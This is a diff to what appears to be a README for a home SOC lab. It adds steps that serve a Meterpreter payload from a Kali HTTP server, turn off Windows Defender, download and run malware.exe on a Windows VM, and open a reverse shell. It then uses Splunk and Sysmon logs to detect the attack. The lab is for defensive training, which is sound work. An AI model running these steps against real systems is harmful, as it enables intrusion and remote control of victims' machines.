@@ -144,7 +144,39 @@ Construct the malware using a command similar to <i>msfvenom -p windows/x64/mete
 <br>
 <img src="https://i.imgur.com/R0p7T2M.png" alt="Basic Home SOC Lab Steps"/>
 <br>
-4. Host Payload wiht HTTP Server. Set up a simple HTTP server on the Kali Linux machine to host the generated malware payload, allowing the Windows VM to download it. This typically involves opening a new terminal tab and using a command like 
+4. Host Payload wiht HTTP Server. Set up a simple HTTP server on the Kali Linux machine to host the generated malware payload, allowing the Windows VM to download it. This typically involves opening a new terminal tab and using a command like <i>python3 -m http.server [port]</i>
+<br>
+<img src="https://i.imgur.com/jlBPEqu.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+5. Disable Windows Defender: On the Windows 10 VM, temporarily disable Windows Defender to allow the simulated malware to execute without immediate detection.
+<br>
+<img src="https://i.imgur.com/GGDJlfE.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+6. Download and Execute Malware: Open a web browser on the Windows VM, navigate to the Kali Linux machine's IP address and port <i> http://[Kali_IP]:[Port]/malware.exe</i>, and download the payload. Execute the downloaded malware.
+<br>
+<img src="https://i.imgur.com/yFZT8lA.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+7. Verify Reverse Shell: Open a command prompt (cmd) on the Windows machine and verify that a connection has been established to the Kali Linux machine. On the Kali Linux VM, confirm the established Meterpreter session and type <i>shell</i> to gain a command-line interface on the compromised Windows machine.
+<br>
+<img src="https://i.imgur.com/kO5wWkQ.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+<img src="https://i.imgur.com/p1pPuzI.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+<img src="https://i.imgur.com/BXWGPB2.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+<img src="https://i.imgur.com/miaKVss.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+<h3> Step 5: Splunk Log Analysis</h3>
+1. Configure Splunk for Sysmon Logs: Ensure that Splunk is configured to ingest Sysmon logs. This often involves adjusting the input.conf file in Splunk to define the source type and directory for Sysmon events. Additionally, create a new index in the Splunk console for these logs.
+<br>
+<img src="https://i.imgur.com/2Lgc0jC.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+<img src="https://i.imgur.com/YXzCH8N.png" alt="Basic Home SOC Lab Steps"/>
+<br>
+2. Analyze Attack Patterns in Splunk: After the malware execution, search specifically for the malware's filename or related process events within Splunk. Observe the logs to identify attack patterns and behaviors, understanding how Sysmon telemetry contributes to detection.
+<br>
+<img src="https://i.imgur.com/61Giuk7.png" alt="Basic Home SOC Lab Steps"/>
+<br>
 
 </p>
 <br>
